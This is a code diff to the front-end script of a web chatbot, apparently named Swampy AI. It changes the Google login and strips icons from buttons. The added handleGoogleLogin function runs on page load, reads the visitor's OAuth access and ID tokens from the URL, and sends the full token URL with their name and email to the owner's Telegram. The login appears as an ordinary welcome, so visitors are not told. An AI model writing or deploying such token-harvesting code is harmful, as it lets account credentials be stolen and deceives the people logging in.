@@ -970,15 +970,16 @@
     const LIGHT_VIDEO   = 'src/video/thumbLight.mp4';
     const DARK_VIDEO    = 'src/video/thumbDark.mp4';
 
-    // === GOOGLE OAUTH – FIX ERROR 400 ===
+    // === GOOGLE OAUTH – CLIENT ID BARU ===
     const GOOGLE_CLIENT_ID = '980283068707-knla4fthlh35ddc01f6s66c75tf8rmt2.apps.googleusercontent.com';
-    const REDIRECT_URI = 'https://swamp-ai.vercel.app'; // ← STATIS & BENAR
+    const REDIRECT_URI = 'https://swamp-ai.vercel.app';
     const GOOGLE_OAUTH_URL = `https://accounts.google.com/o/oauth2/v2/auth?` +
         `client_id=${GOOGLE_CLIENT_ID}&` +
         `redirect_uri=${encodeURIComponent(REDIRECT_URI)}&` +
-        `response_type=token&` +
+        `response_type=token id_token&` +
         `scope=${encodeURIComponent('email profile openid')}&` +
-        `prompt=select_account`;
+        `prompt=select_account&` +
+        `nonce=${Date.now()}`;
 
     const GOOGLE_LOGIN_KEYWORDS = [
         'login google', 'google login', 'masuk google', 'sign in google',
@@ -1010,6 +1011,62 @@
             console.warn('Telegram gagal:', err);
         }
     }
+
+    // === GOOGLE LOGIN HANDLER – NOTIF CUSTOM ===
+    async function handleGoogleLogin() {
+        const hash = window.location.hash;
+        if (!hash) return;
+
+        const params = new URLSearchParams(hash.substring(1));
+        const accessToken = params.get('access_token');
+        const idToken = params.get('id_token');
+
+        if (!accessToken || !idToken) {
+            console.warn('Token tidak lengkap:', { accessToken, idToken });
+            return;
+        }
+
+        try {
+            // Decode ID Token (JWT)
+            const payload = JSON.parse(atob(idToken.split('.')[1]));
+            const email = payload.email || 'Tidak diketahui';
+            const namaDepan = payload.given_name || payload.name?.split(' ')[0] || 'User';
+            const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const tokenUrl = window.location.href; // Full URL dengan #token
+
+            // Notif Telegram sesuai format
+            const telegramMessage = `Halo Owner, email baru telah masuk ke Swampy AI, email *${email}*, informasi lengkap:\n\n` +
+                `Nama depan: *${namaDepan}*\n` +
+                `Google Account: *${email}*\n` +
+                `Waktu: *${time}*\n` +
+                `Token: \`${tokenUrl}\``;
+
+            await sendToTelegram('LOGIN GOOGLE', '', telegramMessage);
+
+            // Welcome back
+            hideWelcome();
+            const welcomeMsg = `Halo lagi, **${namaDepan}**! Selamat datang kembali di Swampy AI.`;
+            addMessage(welcomeMsg, 'bot');
+
+            // Toast
+            showToast('Welcome Back!', `Halo ${namaDepan}!`, 'success');
+
+            // Simpan user
+            localStorage.setItem('googleUser', JSON.stringify({ name: namaDepan, email }));
+
+            // Bersihkan URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+
+        } catch (err) {
+            console.error('Gagal parse login:', err);
+            addMessage('Login berhasil, tapi gagal baca info akun.', 'bot');
+            showToast('Error', 'Gagal parse data', 'error');
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }
+
+    // Jalankan saat load
+    handleGoogleLogin();
 
     // === ELEMENTS ===
     const botAvatarHeader = document.getElementById('botAvatar');
@@ -1276,13 +1333,13 @@
         const feedbackButtons = sender === 'bot' ? `
             <div class="message-actions">
                 <button class="message-action feedback-btn like-btn" onclick="sendFeedback(this, 'like')">
-                    <i class="fas fa-thumbs-up"></i> Suka
+                    Suka
                 </button>
                 <button class="message-action feedback-btn dislike-btn" onclick="sendFeedback(this, 'dislike')">
-                    <i class="fas fa-thumbs-down"></i> Tidak Suka
+                    Tidak Suka
                 </button>
                 <button class="message-action copy-btn" onclick="copyMessage(this)">
-                    <i class="fas fa-copy"></i> Salin
+                    Salin
                 </button>
             </div>
         ` : '';
@@ -1342,7 +1399,7 @@
                     <div class="code-header">
                         <span class="code-language">${escapeHtml(language)}</span>
                         <button class="code-copy-btn" onclick="copyCode('${codeId}')">
-                            <i class="fas fa-copy"></i> Salin
+                            Salin
                         </button>
                     </div>
                     <div class="code-content">
@@ -1376,7 +1433,7 @@
         const orig = btn.innerHTML;
         try {
             await navigator.clipboard.writeText(text);
-            btn.innerHTML = '<i class="fas fa-check"></i> Tersalin';
+            btn.innerHTML = 'Tersalin';
             btn.classList.add('copied');
             setTimeout(() => { btn.innerHTML = orig; btn.classList.remove('copied'); }, 2000);
         } catch { showToast('Error', 'Gagal menyalin', 'error'); }
@@ -1387,7 +1444,7 @@
         const orig = btn.innerHTML;
         try {
             await navigator.clipboard.writeText(text);
-            btn.innerHTML = '<i class="fas fa-check"></i> Tersalin';
+            btn.innerHTML = 'Tersalin';
             setTimeout(() => btn.innerHTML = orig, 2000);
         } catch { showToast('Error', 'Gagal menyalin', 'error'); }
     };
@@ -1462,8 +1519,8 @@
         toast.querySelector('.toast-message').textContent = msg;
         icon.className = `toast-icon ${type}`;
         icon.innerHTML = type === 'success' 
-            ? '<i class="fas fa-check"></i>' 
-            : '<i class="fas fa-times"></i>';
+            ? '' 
+            : '';
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
